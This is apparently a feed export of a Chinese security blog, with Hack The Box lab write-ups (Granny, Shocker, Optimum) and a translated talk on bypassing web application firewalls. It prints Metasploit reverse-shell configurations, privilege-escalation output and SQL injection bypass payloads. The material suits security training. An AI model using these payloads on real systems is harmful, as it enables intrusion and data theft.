\\GRANNY<br><br>-------------------------------------------------------------------------------<br>Administrator            ASPNET                   Guest                    <br>IUSR_GRANPA              IWAM_GRANPA              Lakis                    <br>SUPPORT_388945a0         <br>The command completed successfully.<br></code></pre></div></td></tr></table></figure><h2 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h2><h4 id="exp提权"><a href="#exp提权" class="headerlink" title="exp提权"></a>exp提权</h4><p>依次尝试suggerser提示的exp，全部失败</p><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms14_058_track_popup_menu: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms14_070_tcpip_ioctl: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms15_051_client_copy_image: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms16_016_webdav: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms16_032: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms16_032_secondary_logon_handle_privesc: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span> - exploit/windows/<span class="hljs-keyword">local</span>/ppr_flatten_rec: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[*] Post module execution completed<br><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-22/4.PNG" alt="4"></p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>之前使用<code>getuid</code>命令，但是结果报错，还以为是权限不够。</p><p>msf进程存在于内存之中，以下命令将进程迁移为稳定进程，再使用<code>getuid</code>命令，就不会报错了。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">background<br>use post/windows/manage/migrate<br><span class="hljs-builtin-name">set</span> SESSION 1<br><span class="hljs-builtin-name">run</span><br><br>use exploit/windows/local/ppr_flatten_rec<br><span class="hljs-builtin-name">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> LHOST 10.10.14.7<br><span class="hljs-builtin-name">set</span> LPORT 8899<br><span class="hljs-builtin-name">set</span> SESSION 1<br></code></pre></div></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>失败的提示</p><figure class="highlight prolog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs prolog">[*] <span class="hljs-symbol">Started</span> reverse <span class="hljs-symbol">TCP</span> handler on <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span>:<span class="hljs-number">8899</span> <br>[*] <span class="hljs-symbol">Launching</span> notepad to host the exploit...<br>[+] <span class="hljs-symbol">Process</span> <span class="hljs-number">208</span> launched.<br>[*] <span class="hljs-symbol">Reflectively</span> injecting the exploit <span class="hljs-symbol">DLL</span> into <span class="hljs-number">208.</span>..<br>[*] <span class="hljs-symbol">Injecting</span> exploit into <span class="hljs-number">208</span> ...<br>[*] <span class="hljs-symbol">Exploit</span> injected. <span class="hljs-symbol">Injecting</span> payload into <span class="hljs-number">208.</span>..<br>[*] <span class="hljs-symbol">Payload</span> injected. <span class="hljs-symbol">Executing</span> exploit...<br>[*] <span class="hljs-symbol">Exploit</span> thread executing (can take a while to run), waiting <span class="hljs-number">30</span> sec ...<br>[*] <span class="hljs-symbol">Exploit</span> completed, but no session was created.<br></code></pre></div></td></tr></table></figure><p>waiting 30 sec，当看到这个提示，于是执行失败以后，输入以下命令。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> <span class="hljs-built_in">wait</span> 20<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过web应用防火墙</title>
    <link href="/2019/02/18/x/"/>
    <url>/2019/02/18/x/</url>
    
    <content type="html"><![CDATA[<p>以下内容是对该pdf的翻译：<br>《OWASP_Stammtisch_Frankfurt_-<em>Web_Application_Firewall_Bypassing</em>-_how_to_defeat_the_blue_team》</p><p>作者：Khalil Bijjou<br>译者：whale</p><p><strong>前景提要</strong><br>配置了waf的网站数量在增加<br>waf让渗透测试变得更加困难<br>在渗透测试中，绕过waf是一个重要的部分</p><h2 id="对web应用防火墙的介绍"><a href="#对web应用防火墙的介绍" class="headerlink" title="对web应用防火墙的介绍"></a>对web应用防火墙的介绍</h2><ol><li>在安全层面保护web应用</li><li>配置在用户和web服务器交互的中间</li><li>比传统防火墙更理解HTTP交互</li><li>检查恶意交互然后阻止它</li></ol><h2 id="waf的功能："><a href="#waf的功能：" class="headerlink" title="waf的功能："></a>waf的功能：</h2><ul><li>预处理阶段：决定是否对一个请求进行继续处理</li><li>标准化阶段：理解用户输入</li><li>验证阶段：根据策略检查用户的输入</li></ul><h2 id="输入验证："><a href="#输入验证：" class="headerlink" title="输入验证："></a>输入验证：</h2><p>安全模式定义了如何执行检查<br>检查由正则表达式组成<br>三种安全模式：1. 主动安全策略 2. 被动安全策略 3. 混合安全策略</p><table><thead><tr><th>主动安全策略（基于白名单）</th><th>被动安全策略（基于黑名单）</th></tr></thead><tbody><tr><td>除非已知安全的，其他的都拒绝</td><td>拒绝黑名单上的，其他都允许</td></tr><tr><td>预防0day漏洞</td><td>waf随带的特性</td></tr><tr><td>比黑名单更加安全</td><td>配置速度快</td></tr><tr><td>需要对应用比较了解</td><td>不需要太多知识</td></tr><tr><td>创建策略是一个比较花时间的过程</td><td>保护许多类型的应用程序</td></tr><tr><td></td><td>倾向于误报</td></tr><tr><td></td><td>比较消耗资源</td></tr></tbody></table><h2 id="绕过的方式和技巧"><a href="#绕过的方式和技巧" class="headerlink" title="绕过的方式和技巧"></a>绕过的方式和技巧</h2><ul><li>预处理阶段：使得waf跳过输入验证    </li><li>标准化阶段：使得waf解释input与服务端后端不同</li><li>验证阶段：使用waf检测不到的载荷</li></ul><h2 id="预处理阶段的利用"><a href="#预处理阶段的利用" class="headerlink" title="预处理阶段的利用"></a>预处理阶段的利用</h2><p>绕过参数验证</p><ul><li><p>PHP从参数名称中删除空格或将它们转换为下划线<br><code>http://www.website.com/products.php?%20productid=select 1,2,3</code></p></li><li><p>asp移除了“%”字符后面的十六进制数字<br><code>http://www.website.com/products.aspx?%productid=select 1,2,3</code><br>一个waf不会拒绝未知的参数，那么用这种技术就可以绕过。</p></li></ul><h2 id="预处理阶段的利用案例"><a href="#预处理阶段的利用案例" class="headerlink" title="预处理阶段的利用案例"></a>预处理阶段的利用案例</h2><h4 id="X-Headers"><a href="#X-Headers" class="headerlink" title="X-* Headers"></a>X-* Headers</h4><ul><li>waf可能被配置为相信特定内网ip</li><li>输入验证可能不会应用在源于这些ip的请求</li><li>如果waf从请求头中获取这些ip，而请求头可能被用户改变，那么绕过就可能发生。</li><li>用户可以控制以下的http头：<figure class="highlight sas"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sas"><span class="hljs-meta">X</span>-Originating-IP<br><span class="hljs-meta">X</span>-Forwarded-For<br><span class="hljs-meta">X</span>-Remote-IP<br><span class="hljs-meta">X</span>-Remote-Addr<br></code></pre></div></td></tr></table></figure><h4 id="异常http方式"><a href="#异常http方式" class="headerlink" title="异常http方式"></a>异常http方式</h4><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-18/3.PNG" alt="3"></li></ul><p>未正确配置的web服务器可能接受异常HTTP方式</p><p>一个waf如果只检查get和post请求，就可能绕过</p><h4 id="使得waf超负荷"><a href="#使得waf超负荷" class="headerlink" title="使得waf超负荷"></a>使得waf超负荷</h4><ul><li><p>如果载入太慢了，一个waf可能被设置为跳过输入验证</p></li><li><p>对waf经常性的请求</p></li><li><p>大量恶意请求，可能会导致waf过载，然后跳过一些请求</p></li></ul><h4 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h4><ul><li>使用同样的名称发送一系列参数</li><li>解释这个请求的技术：<br><code>http://www.website.com/products/?productid=1&amp;productid=2</code></li></ul><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">asp.net -&gt; <span class="hljs-attribute">productid</span>=1,2<br>jsp -&gt; <span class="hljs-attribute">productid</span>=1<br>php -&gt; <span class="hljs-attribute">productid</span>=2<br></code></pre></div></td></tr></table></figure><h4 id="误匹配案例"><a href="#误匹配案例" class="headerlink" title="误匹配案例"></a>误匹配案例</h4><p>以下的请求</p><p><code>?productid=select 1,2,3 from table</code></p><p>可以被分为<code>?productid=select1&amp;productid=2,3 from table</code></p><ul><li>waf看到两个不同的参数，就可能不会检查payload</li><li>asp.net背后会将参数合并</li></ul><h4 id="http参数碎片"><a href="#http参数碎片" class="headerlink" title="http参数碎片"></a>http参数碎片</h4><ul><li>将代码分割到不同的参数</li><li>查询案例：<br>sql= “SELECT * FROM table WHERE uid= “+$_GET[‘uid’]+” and pid= +$_GET[‘pid’]“</li><li>以下的请求：<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.website.com/index.php?uid=<span class="hljs-number">1</span>+union/*&amp;pid=*/select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure>将会导致以下sql查询<figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">sql= &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> table <span class="hljs-keyword">WHERE</span> uid= <span class="hljs-number">1</span><span class="hljs-keyword">union</span><span class="hljs-comment">/* and pid= */</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure><h4 id="双url编码"><a href="#双url编码" class="headerlink" title="双url编码"></a>双url编码</h4></li><li>waf将url编码字符解析为ascii编码</li><li>waf可能被配置为仅仅解码一次</li><li>双url编码是可能导致绕过的payload <code>’s’ -&gt; %73 -&gt; %25%37%33</code></li><li>以下的payload包含了一个双url编码字符<br><code>1 union%25%37%33elect 1,2,3</code></li></ul><h2 id="绕过基于规则检测"><a href="#绕过基于规则检测" class="headerlink" title="绕过基于规则检测"></a>绕过基于规则检测</h2><p>两种方式：</p><p>使用payloads来暴力枚举</p><p>对wafs规则进行逆向工程</p><h4 id="渗透测试者的方式"><a href="#渗透测试者的方式" class="headerlink" title="渗透测试者的方式"></a>渗透测试者的方式</h4><ul><li>和渗透测试类似</li><li>取决于六个阶段，然而阶段0可能不总是必须的</li></ul><p>阶段0：<strong>禁用waf来确认漏洞</strong></p><ul><li>更容易在应用程序中寻找安全漏洞（对应用的安全水平的审查更加精确）</li><li>当waf开启时候，让测试更加有针对性</li><li>在一些渗透测试中可能不被认可</li></ul><p>阶段1：<strong>对目标进行信息搜集</strong></p><ul><li>是后续阶段的基础</li><li>信息搜集:<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">web服务器<br>编程语言<br>waf<span class="hljs-meta">&amp;安全模式</span><br>内网ip地址<br></code></pre></div></td></tr></table></figure></li></ul><p>阶段2：<strong>攻击预处理阶段</strong><br>目标：使得waf省略输入验证</p><ul><li>确认http请求的那一部分会被waf检查，进而构造payload</li></ul><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">发送只有某个部分不同的许多请求<br>发现哪个请求会被阻止<br>尝试构造一个exploit<br></code></pre></div></td></tr></table></figure><p>阶段3：<strong>尝试一个误匹配</strong><br>目标：使得waf和服务器解释请求不一样，从而不会检测到它</p><ul><li>需要知道服务段的技术</li></ul><p>阶段4：<strong>绕过字符集</strong><br>目标：发现一个payload，不会被waf规则集阻止</p><ul><li>暴力枚举，发送不同的payload</li><li>对规则集进行逆向工程<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">发送对构造payload有用的字符和关键词<br>发现哪些会被阻塞<br>尝试构造一个<span class="hljs-built_in">exp</span>基于以前步骤的结果<br></code></pre></div></td></tr></table></figure>阶段5：<strong>确认各式漏洞</strong><br>目标：发现其他不会被waf检测的漏洞</li><li>失效的验证机制</li><li>提权漏洞</li></ul><p>阶段6：<strong>漏洞披露</strong><br>目标：通知用户这些漏洞</p><ul><li>建议客户修复root权限导致的漏洞</li><li>时间不充足时，漏洞/弱点应该被waf规则所保护</li><li>解释waf可以帮助减轻漏洞危害，但不能修复它</li></ul><h2 id="WAFNinja"><a href="#WAFNinja" class="headerlink" title="WAFNinja"></a>WAFNinja</h2><ul><li>用python写的命令行工具</li><li>自动化的解决方式</li><li>已经被渗透测试者所使用</li><li>支持</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>连接<br><span class="hljs-built_in">get</span>和<span class="hljs-built_in">post</span>参数<br>对cookies的使用<br></code></pre></div></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>使用WAFNinja在测试环境中来尝试绕过三个waf</li><li>使用标准配置来配置waf</li><li>在每个waf后的web应用有两个漏洞</li></ul><p>comodo WAF</p><ul><li>是三个测试wafs中，规则最智能的</li><li>sql注入载荷发现：<code>0 union/**/select 1,version(),@@datadir</code></li><li>发现敏感信息</li></ul><p>modsecurity WAF</p><ul><li>非常严格的规则</li><li>发现的sql注入payload:<code>1+uni%0Bon+se%0Blect+1,2,3</code>,<br>但是没有被后端服务器执行</li></ul><p>aqtronix webknight waf</p><ul><li>三个waf中规则漏洞最多的</li><li>发现了以下sql注入载荷：<code>0 union(select 1,@@hostname,@@datadir)</code></li><li>发现了敏感信息</li></ul>]]></content>
    
    
    <categories>
      
      <category>waf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Shocker（shellshock破壳漏洞）</title>
    <link href="/2019/02/10/x/"/>
    <url>/2019/02/10/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.56</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br><span class="hljs-attribute">2222</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">2</span>p<span class="hljs-number">2</span> Ubuntu <span class="hljs-number">4</span>ubuntu<span class="hljs-number">2</span>.<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>访问web，是一个单纯的图片，查看源码无发现。</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>目录扫描ing.<br>两个目录403，未发现其他目录</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>低版本目录枚举：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">ssh -p <span class="hljs-number">2222</span> root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.56</span><br><br>python ssh.py --port <span class="hljs-number">2222</span> --username root <span class="hljs-number">10.10</span>.<span class="hljs-number">10.56</span><br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python2.7/</span>dist-packages<span class="hljs-regexp">/paramiko/</span>rsakey.py:<span class="hljs-number">119</span>: CryptographyDeprecationWarning: signer and verifier have been deprecated. Please use sign and verify instead.<br>  algorithm=hashes.SHA1(),<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python2.7/</span>dist-packages<span class="hljs-regexp">/paramiko/</span>rsakey.py:<span class="hljs-number">99</span>: CryptographyDeprecationWarning: signer and verifier have been deprecated. Please use sign and verify instead.<br>  algorithm=hashes.SHA1(),<br>root is a valid user!<br></code></pre></div></td></tr></table></figure><p>经过以上探测，没有发现任何攻击路径，然后找一下中间件版本漏洞。</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><strong>Apache HTTPD信息泄露漏洞(CVE-2016-4979)</strong><br>没发现可以exp</p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Apache</span> &lt; <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">34</span> / &lt; <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">27</span> - OPTIONS Memory Leak                                                      | exploits/linux/webapps/<span class="hljs-number">42745</span>.py<br><br><span class="hljs-attribute">python3</span> <span class="hljs-number">42745</span>.py -u http://<span class="hljs-number">10.10.10.56</span> -a<span class="hljs-meta"></span><br><span class="hljs-meta">[ok] http://10.10.10.56: &#x27;GET,HEAD,POST,OPTIONS&#x27;</span><br></code></pre></div></td></tr></table></figure><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>nikto -h 10.10.10.56</p><p>nessus scan扫描都没有发现漏洞，尤其是目标主机名称为“Shocker”，我特地使用了Bash Shellshock Detection策略。</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">This <span class="hljs-keyword">policy</span> <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span> remote checks <span class="hljs-keyword">for</span> the Shellshock vulnerability (CVE<span class="hljs-number">-2014</span><span class="hljs-number">-6271</span>) via HTTP, FTP, SMTP, telnet, <span class="hljs-keyword">and</span> SIP. SSH credentials can optionally be provided <span class="hljs-keyword">to</span> test <span class="hljs-keyword">for</span> CVE<span class="hljs-number">-2014</span><span class="hljs-number">-6271</span> via SSH <span class="hljs-keyword">and</span> enumerate missing software updates <span class="hljs-keyword">for</span> CVE<span class="hljs-number">-2014</span><span class="hljs-number">-6271</span> <span class="hljs-keyword">and</span> CVE<span class="hljs-number">-2014</span><span class="hljs-number">-7291.</span> <br></code></pre></div></td></tr></table></figure><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>目录枚举发现/user.sh，下载后内容如下：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Content</span>-Type: text/plain<br><br><span class="hljs-attribute">Just</span> an uptime test script<br><br> <span class="hljs-attribute">01</span>:<span class="hljs-number">13</span>:<span class="hljs-number">47</span> up <span class="hljs-number">6</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">07</span>,  <span class="hljs-number">0</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">00</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>确认apache服务使用了cgi（通用网关接口），可以调用Linux的 bash shell。</p><p>job.rc</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/multi/http/apache_mod_cgi_bash_env_exec<br><span class="hljs-builtin-name">set</span> RHOST 10.10.10.56<br><span class="hljs-builtin-name">set</span> TARGETURI /cgi-bin/user.sh<br><span class="hljs-builtin-name">set</span> SRVHOST 10.10.14.17<br><span class="hljs-builtin-name">set</span> SRVPORT 7788<br><span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> target 1<br>run<br></code></pre></div></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">getuid</span><br><span class="hljs-attribute">Server</span> username: uid=<span class="hljs-number">1000</span>, gid=<span class="hljs-number">1000</span>, euid=<span class="hljs-number">1000</span>, egid=<span class="hljs-number">1000</span><br><span class="hljs-attribute">sysinfo</span><br><span class="hljs-attribute">Computer</span>     : <span class="hljs-number">10.10.10.56</span><br><span class="hljs-attribute">OS</span>           : Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span> (Linux <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">96</span>-generic)<br><span class="hljs-attribute">Architecture</span> : x<span class="hljs-number">64</span><br><span class="hljs-attribute">BuildTuple</span>   : i<span class="hljs-number">486</span>-linux-musl<br><span class="hljs-attribute">Meterpreter</span>  : x<span class="hljs-number">86</span>/linux<br></code></pre></div></td></tr></table></figure><p>观察到meterpreter构架为86，于是更改一下payload和target。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">background<br><span class="hljs-keyword">search</span> suggester<br>use post/multi/recon/local_exploit_suggester<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">3</span><br>run<br><br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.56</span> - exploit/linux/<span class="hljs-keyword">local</span>/bpf_priv_esc: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.56</span> - exploit/linux/<span class="hljs-keyword">local</span>/bpf_sign_extension_priv_esc: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.56</span> - exploit/linux/<span class="hljs-keyword">local</span>/glibc_realpath_priv_esc: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-10/2.PNG" alt="2"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://blog.csdn.net/fish43237/article/details/39609031">shellshock漏洞介绍：</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>）Linux WEB Server一般可以提供CGI接口，允许远程执行<span class="hljs-keyword">Bash命令；</span><br><span class="hljs-keyword"></span><br><span class="hljs-number">2</span>）对于HTTP头部，CGI脚本解析器会将其当作环境变量，调用<span class="hljs-keyword">bash的env相关函数设置到临时环境变量中；</span><br><span class="hljs-keyword"></span><br><span class="hljs-number">3</span>）HTTP协议允许发送任意客户端自定义的HTTP头部；<br><br><span class="hljs-number">4</span>）这样就产生了一个完整的可供<span class="hljs-keyword">Bash命令注入的场景，客户端故意发送构造好的带攻击命令的HTTP头部到服务端，服务端调用设置环境变量的函数，直接执行了客户端指定的头部里面的命令。并且还会将结果一并返回给客户端。</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Optimum（win64-msf提权）</title>
    <link href="/2019/02/07/x/"/>
    <url>/2019/02/07/x/</url>
    
    <content type="html"><![CDATA[<p>Optimum（win64-msf提权）</p><p>参考资料：<a href="https://isroot.nl/2018/06/25/hack-the-box-write-up-optimum/">https://isroot.nl/2018/06/25/hack-the-box-write-up-optimum/</a></p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    HttpFileServer httpd <span class="hljs-number">2.3</span><br>|_http-<span class="hljs-keyword">server</span>-<span class="hljs-keyword">header</span>: HFS <span class="hljs-number">2.3</span><br>|_http-title: HFS /<br>Service <span class="hljs-keyword">Info</span>: OS: Windows; CPE: cpe:/o:microsoft:windows<br></code></pre></div></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span 